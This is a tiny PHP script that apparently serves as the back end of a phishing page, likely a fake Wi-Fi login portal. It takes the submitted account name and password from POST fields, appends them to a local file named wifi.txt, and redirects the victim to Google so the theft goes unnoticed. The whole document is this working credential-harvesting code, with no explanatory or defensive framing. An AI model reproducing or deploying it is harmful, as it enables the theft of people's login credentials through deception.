<?php

file_put_contents("../datas/wifi.txt", "Account: " . $_POST['key2'] . " Pass: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
